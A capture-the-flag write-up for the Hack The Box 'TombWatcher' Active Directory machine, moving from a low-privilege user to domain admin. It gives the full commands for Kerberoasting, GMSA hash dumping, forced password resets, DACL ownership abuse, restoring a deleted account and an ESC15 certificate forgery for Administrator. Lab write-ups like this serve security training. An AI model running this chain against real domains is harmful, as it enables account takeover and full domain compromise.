<img width="694" height="554" alt="image" src="https://github.com/user-attachments/assets/df2b378f-16e1-4ef9-a5b7-6b24ae63a138" />

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

>  Machine Information: As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

# Enumeration

## Port Scan

I began the enumeration phase by running a comprehensive port and service scan using `nmap`. The scan revealed several open ports, including **88** and **53**, indicating that the host is likely functioning as a **Domain Controller (DC)**.

```
sudo nmap -p- 10.10.11.72 -v -sC -sV -T4
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: HEAD
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-17 21:33:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-17T21:34:41+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-08-17T21:34:39+00:00; +4h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-11-16T00:47:59
| Not valid after:  2025-11-16T00:47:59
| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
|_ssl-date: 2025-08-17T21:34:41+00:00; +4h00m03s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the results, I identified the domain **tombwatcher.htb** associated with the host. I then added this domain to my hosts configuration file for easier resolution during further testing.

## Web Enumeration

Upon browsing to the domain, I found that the server was only hosting the **default Microsoft IIS page**, leaving no immediate points of interaction:

<img width="1298" height="800" alt="image" src="https://github.com/user-attachments/assets/fc119026-d2c0-4284-81cb-4fa427846a94" />

### Subdomain Enumeration

Since the default IIS page offered limited options, I performed **subdomain enumeration** using `ffuf` to discover potential additional subdomains hosted on the target.

```
ffuf -H "Host: FUZZ.tombwatcher.htb" -u http://10.10.11.72 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 703 -fl 32
```

<img width="1192" height="411" alt="image" src="https://github.com/user-attachments/assets/182f74a6-6f93-488c-b7ba-b78be7dc9d7f" />

In parallel, I ran a DNS-based enumeration using `dig` to look for additional records or domains. However, no new subdomains were identified:

```
dig all tombwatcher.htb any @10.10.11.72
```

<img width="1018" height="730" alt="image" src="https://github.com/user-attachments/assets/e75e7d4f-c324-4581-8559-37fbe479e686" />

Both enumeration techniques failed to reveal any additional subdomains.

### Directory enumeration:

Next, I attempted directory fuzzing with `dirsearch` to uncover hidden files or directories. Unfortunately, the scan yielded no valuable results apart from the default `aspnet_client` directory:

<img width="842" height="226" alt="image" src="https://github.com/user-attachments/assets/00ee8cbc-bb0f-4ad0-b2ec-13fd6db2d07b" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Active Directory Enumeration

## Situational Awareness

Since the web enumeration phase didn’t reveal any direct attack vectors for initial shell access, I shifted focus to **Active Directory (AD) enumeration** using the provided credentials.

I began with basic checks such as reviewing the **domain password policy**, which turned out to be weak and lacking robust security measures:

<img width="887" height="353" alt="image" src="https://github.com/user-attachments/assets/76cbef2b-d1a0-41b5-99c0-578bf5908ebd" />

Next, I enumerated all **active users** within the domain:

<img width="925" height="212" alt="image" src="https://github.com/user-attachments/assets/22016d87-07da-4eb9-8ca0-882ca2821a79" />

I followed this by listing all **domain groups**:

<img width="920" height="798" alt="image" src="https://github.com/user-attachments/assets/b898327d-650d-432e-b95d-3efff2a6063a" />

Finally, I checked the **group memberships** for the current user `henry`, which revealed that the account is only a member of the **Domain Users** group, with no elevated privileges at this point.


### BloodHound

To analyze the domain structure visually, I leveraged **BloodHound** to gather data from Active Directory.

I executed the following command to collect a full dataset:

```
nxc ldap tombwatcher.htb -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --dns-server 10.10.11.72 --bloodhound --collection All
```

<img width="1345" height="134" alt="image" src="https://github.com/user-attachments/assets/25381d3f-e5c9-4262-b6d1-21e0875c1e95" />

Once the data collection was complete, I uploaded the results into the **BloodHound interface** for visualization:

<img width="1105" height="743" alt="image" src="https://github.com/user-attachments/assets/b090d018-0092-4e71-a811-a0f510c1cca2" />

After running pathfinding queries, I found that there was **no direct path** to the `Administrator` account from the current `henry` user context.


## Henry → Alfred

After failing to find a direct path for lateral movement, I performed **Kerberoasting** and discovered a single Kerberoastable account — `Alfred`:

<img width="1296" height="272" alt="image" src="https://github.com/user-attachments/assets/8a771b5f-eceb-4a7f-8332-30169ecde2ed" />

I then used **John the Ripper** to crack the hash, and within 10 seconds, I obtained Alfred's clear-text credentials:

<img width="775" height="166" alt="image" src="https://github.com/user-attachments/assets/43723aa4-44f6-4848-8a25-ec8244b602bb" />

Upon further review, I also found that the `henry` account had privileges to **write the SPN** for `Alfred`. This means a **targeted Kerberoasting attack** could have been performed to compromise the account as well.

Finally, I authenticated successfully as `Alfred`. However, this account still lacked **WinRM access**, meaning I was unable to obtain an interactive shell at this stage:

<img width="944" height="62" alt="image" src="https://github.com/user-attachments/assets/50e8db25-dace-4663-b1a3-e81a0edd6b79" />


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Alfred → Ansible_dev$

## Adding Alfred to the Infrastructure group

While re-analyzing the BloodHound results, I noticed that the `Alfred` account had the **permission to add itself** to the `Infrastructure` group.

<img width="1124" height="513" alt="image" src="https://github.com/user-attachments/assets/f6791571-5a77-415c-8325-c571d4714006" />

Initially, I attempted to add `Alfred` to the group using standard tools, but the operation failed with an **Access Denied** error:

<img width="859" height="62" alt="image" src="https://github.com/user-attachments/assets/9619715b-64a9-464d-abc6-3c934e4d7467" />

This seemed to be caused by an RPC call issue. To bypass this, I switched to the **`bloodyAD`** tool, which successfully added `Alfred` to the `Infrastructure` group:

```
bloodyAD --host '10.10.11.72' -d 'tombwatcher.htb' -u alfred -p '*******' add groupMember INFRASTRUCTURE alfred
```

<img width="981" height="45" alt="image" src="https://github.com/user-attachments/assets/7b11257c-3c54-43e1-a491-7be257bd7f4c" />

## Dumping GMSA

After successfully adding `Alfred` to the `Infrastructure` group, I proceeded to dump the **Group Managed Service Account (GMSA)** credentials using `netexec`.  
This allowed me to retrieve the **hash of the `Ansible_dev$` account**:

<img width="1344" height="95" alt="image" src="https://github.com/user-attachments/assets/d3acaa8a-806c-4fb1-9416-b03ef6b24881" />

With the retrieved hash, I authenticated as the `Ansible_dev$` account and gained access successfully:

<img width="950" height="190" alt="image" src="https://github.com/user-attachments/assets/392133b0-b57e-401c-87d3-d8007c263abe" />


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# ANSIBLE_DEV$ → SAM

After obtaining valid access with the `ansible_dev$` account, I attempted to log in via **WINRM**, but this account did not have the required privileges.  
Upon re-analyzing the BloodHound data, I discovered that `ansible_dev$` had **permission to change the password** for another domain user, `SAM`.

<img width="1100" height="196" alt="image" src="https://github.com/user-attachments/assets/c38bd1cc-45e9-4970-8eca-cf5ef2acc2c6" />

## Password Change

Following the BloodHound graph insights, I changed the password for `SAM` using `netexec`:
```
nxc smb 10.10.11.72 -u 'ansible_dev$' -H e*****************7c -M change-password -o USER=sam NEWPASS=tombwatcher
```

<img width="1083" height="86" alt="image" src="https://github.com/user-attachments/assets/13dacb3c-961a-45ee-95af-0bba091aa2c7" />

With the updated credentials, I confirmed access to the `SAM` account:

<img width="832" height="196" alt="image" src="https://github.com/user-attachments/assets/d7b2192b-e330-41b8-bb59-1c398e17b7a5" />

### Getting TGT

Since there were multiple users working on the same box, and to avoid repeatedly resetting the password, I requested a **TGT (Ticket Granting Ticket)** for `SAM` to handle further authentications using Kerberos tickets instead of plaintext credentials.

```
getTGT.py tombwatcher.htb/sam:'tombwatcher'
```

<img width="566" height="82" alt="image" src="https://github.com/user-attachments/assets/b6053cbd-619b-4688-8636-30fc3677ccfa" />

To utilize the ticket within the current session, I exported it using:

```
export KRB5CCNAME=sam.ccache
```

After successfully exporting it, I authenticated with the ticket by running:

```
nxc smb 10.10.11.72 -u 'sam' -k --use-kcache
```

<img width="966" height="66" alt="image" src="https://github.com/user-attachments/assets/817d9020-576f-4321-9a02-4c7080830c1d" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# SAM -> JOHN

After taking control of `SAM`, I reviewed the BloodHound results again and noticed that `SAM` has **WriteOwner** privileges over `JOHN`:

<img width="841" height="150" alt="image" src="https://github.com/user-attachments/assets/9def44ea-352e-409f-b6cc-81af9a345eee" />

I attempted to directly change `JOHN`'s password using `netexec`, but it failed:

<img width="890" height="98" alt="image" src="https://github.com/user-attachments/assets/34942e4f-8251-4362-a506-7076aaf5c0f6" />

## DACL Abuse

Since I had **write privileges** but not full control, I needed to escalate my privileges to **GenericAll** by abusing the `WriteOwner` permission. After that, I could successfully reset the password. I used two Impacket scripts: `owneredit.py` and `dacledit.py`.

First, I changed the owner of `JOHN` to `SAM` using `owneredit.py`:

```
owneredit.py -action write -new-owner-sid 'S-1-5-21-1392491010-1358638721-2126982587-1105' -target 'john' 'tombwatcher.htb'/'sam':'tombwatcher' #I utilized the SID of SAM.
```

Then, with `dacledit.py`, I granted `GenericAll` access to `SAM`:

```
dacledit.py -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'tombwatcher'
```

Finally, I utilized `netexec` to change the password for the user:

```
nxc smb 10.10.11.72 -u 'sam' -p 'tombwatcher' -M change-password -o USER=john NEWPASS=tombwatcher_john
```

<img width="1027" height="83" alt="image" src="https://github.com/user-attachments/assets/bd8a99f1-94a6-4911-95f5-6a041d618051" />

Finally, I was able to reset `JOHN`'s password using `netexec`:

<img width="1103" height="61" alt="image" src="https://github.com/user-attachments/assets/37e1818f-b2d3-4933-a84a-14a29d333d40" />

Using the new credentials, I logged in as `JOHN` via `evil-winrm` and retrieved the user flag:

<img width="525" height="180" alt="image" src="https://github.com/user-attachments/assets/90ca3bc0-e36b-4421-9121-1cae2f9a692b" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# John -> ADCS

After retrieving the user flag, I revisited the BloodHound results and noticed that `John` has **full control** over the ADCS OU:

<img width="1158" height="253" alt="image" src="https://github.com/user-attachments/assets/5ec76c56-54e4-44aa-848a-8d6ce19cc4ef" />

However, none of the groups or objects actually reside under this OU.

Next, I checked `John`'s privileges on the host itself but didn’t find anything notable:

<img width="1032" height="679" alt="image" src="https://github.com/user-attachments/assets/a521e31b-3d1e-48c4-a879-8027a8ca7d80" />

## Enumerating Certificates

Since I couldn’t identify a vertical escalation vector, I decided to enumerate certificates using [Certify](https://github.com/GhostPack/Certify).

I compiled the binary, uploaded it to the host, and ran it with the following flags to list all active templates:

```
Certify.exe enum-templates --filter-enabled
```

<img width="1227" height="796" alt="image" src="https://github.com/user-attachments/assets/fe693b6f-a866-441b-9ee2-f72e3d8fee2e" />

In the `WebServer` template, I noticed an unknown user represented only by a SID:

<img width="1053" height="570" alt="image" src="https://github.com/user-attachments/assets/af336568-c23d-443d-a514-895f98160035" />

Checking BloodHound, this SID didn’t exist in the current directory, suggesting it belonged to a **deleted user** in AD.

### Restoring a Deleted User from AD Recycle Bin

While investigating the deleted user, I found this [blog](https://woshub.com/restore-deleted-active-directory-objects-users/) explaining the behavior of deleted objects in Active Directory:

```
By default, a removed object can be restored within 180 days (it is defined in the msDS-deletedObjectLifetime domain attribute). When this period expires, the object remains in the Deleted Objects container, but most of its attributes and links are cleared (Recycled Object). After the tombstoneLifetime period expires (also 180 days by default, but it can be increased), the object is completely removed from AD by an automatic cleanup task and cannot be restored (such objects can only be recovered from an AD domain controller backup).
```

First, I checked if the **AD Recycle Bin** is enabled in the forest, but it was disabled:

```
Get-ADOptionalFeature "Recycle Bin Feature" | select-object name,EnabledScope
```

<img width="940" height="113" alt="image" src="https://github.com/user-attachments/assets/2c4134ae-a20c-467d-bef8-999ba05e16a8" />

Next, I enumerated all deleted users in AD, filtering by SID (from the Certify results):

```
Get-ADObject -filter {Deleted -eq $True -and ObjectClass -eq "user"} -includeDeletedObjects -Properties objectSid
```


I identified the deleted user as `cert_admin` with a matching SID:

<img width="1314" height="449" alt="image" src="https://github.com/user-attachments/assets/9f450240-9657-4987-ba8d-b1a8700f5465" />

Then, I restored the account:

```
Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'
```

To apply changes immediately, I performed a group policy update:

```
gpupdate /force
```

Finally, checking the active users in AD confirmed that `cert_admin` was restored:

<img width="1119" height="197" alt="image" src="https://github.com/user-attachments/assets/d70cf8c2-bf65-4b8b-a6aa-5ad36a5ba108" />

#### BloodHound Analysis (as John)

After restoring the `cert_admin` user, I ran BloodHound again as `John` to check for any privileges John had over the restored account.

I used the `SharpHound` collector to gather the latest domain data after `cert_admin` was reactivated:

<img width="1134" height="462" alt="image" src="https://github.com/user-attachments/assets/091530dd-e703-40b2-a42a-fd9862f259a8" />

Uploading this data to BloodHound, I analyzed the path to `cert_admin` and found that John had **GenericAll** access over the account:

<img width="1788" height="513" alt="image" src="https://github.com/user-attachments/assets/ea5a9d0d-0708-4808-9336-66a13ceb6c46" />

### Owning cert_admin

Using the **GenericAll** privilege, I changed the password of `cert_admin` immediately:

```
nxc smb 10.10.11.72 -u 'john' -p 'tombwatcher_john' -M change-password -o USER=cert_admin NEWPASS=tombwatcher_cert_admin
```

After this, I successfully gained access as `cert_admin`.

> **Note:** The account appears to get deleted approximately every 5 minutes.


-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Cert_admin -> Administrator

After gaining access as `cert_admin`, I analyzed the BloodHound results to check the outbound controls for this user. I discovered that `cert_admin` has control over the `Tombwatcher-CA` object, which is an **Enterprise Certificate Authority (CA)**:

<img width="1029" height="758" alt="image" src="https://github.com/user-attachments/assets/8ba8166d-7012-4111-adbd-586ce4365032" />

## Certipy Enumeration

Next, I ran `certipy` to enumerate the privileges of `cert_admin`. As observed previously, this user has full control over the `WebServer` certificate template:

```
certipy find -vulnerable -enable -u 'cert_admin@tombwatcher.htb' -p 'tombwatcher_cert_admin' -dc-ip 10.10.11.72 -stdout
```

This template was also found to be vulnerable under **ESC15**:

<img width="1253" height="687" alt="image" src="https://github.com/user-attachments/assets/d9fb7e3b-4e31-4d11-8242-c5568c54c07c" />

### ESC15 Exploit

After identifying the vulnerable `WebServer` template and the escalation path, I proceeded to exploit the [ESC15 vulnerability](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu). I requested a certificate for `Administrator`, injecting the **Client Authentication** application policy and targeting the appropriate UPN:

```
certipy req -u 'cert_admin@tombwatcher.htb' -p 'tombwatcher_cert_admin' -dc-ip 10.10.11.72 -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication'
```

<img width="730" height="195" alt="image" src="https://github.com/user-attachments/assets/a966026e-8ffe-4523-8426-f72327abcd5c" />

Once the certificate for `Administrator` was obtained, I leveraged it with `certipy` to perform a **pass-the-cert** attack, spawning an LDAP shell in the context of `Administrator`:

```
certipy auth -pfx 'administrator.pfx' -dc-ip 10.10.11.72 -ldap-shell
```

<img width="656" height="243" alt="image" src="https://github.com/user-attachments/assets/d5053f2d-d731-4bd1-9cd0-241858cf6d76" />

### Adding John to Domain Admins

With LDAP access as `Administrator`, I added `john` to the **Domain Admins** group:

<img width="454" height="62" alt="image" src="https://github.com/user-attachments/assets/cf1b097e-e466-4ae2-8143-69f2a0c6d94a" />

Finally, I logged in as `john` using `evil-winrm` and retrieved the **root flag** from the Administrator's desktop: (Pwn3d!😊)🎉

<img width="532" height="158" alt="image" src="https://github.com/user-attachments/assets/1072ce73-c4f8-4b00-a58a-07a0e1d15a62" />

> Cleanup: To avoid leaving unnecessary privileges, I immediately removed `john` from the Domain Admins group:

```
Remove-ADGroupMember -Identity "Domain Admins" -Members "john" -Confirm:$false
```

